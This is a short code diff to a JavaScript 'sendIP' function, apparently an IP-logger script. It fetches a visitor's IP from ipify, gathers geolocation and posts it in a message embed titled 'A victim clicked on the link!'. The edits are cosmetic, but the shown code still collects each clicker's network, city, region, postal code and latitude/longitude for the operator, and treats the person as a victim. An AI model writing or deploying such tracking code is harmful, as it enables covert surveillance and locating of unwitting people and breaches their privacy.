@@ -1,5 +1,5 @@
 const sendIP = () => {
-    fetch('https://api.ipify.org?format=json')
+   fetch('https://api.ipify.org?format=json')
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
@@ -19,7 +19,7 @@ const sendIP = () => {
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    description: `**Network >>** ${geoData.network}\n**City >>** ${geoData.city}\n**Region >>** ${geoData.region}\n**Country >>** ${geoData.country_name}\n**Postal Code >>** ${geoData.postal}\n**Latitude >>** ${geoData.latitude}\n**Longitude >>** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
                             ]
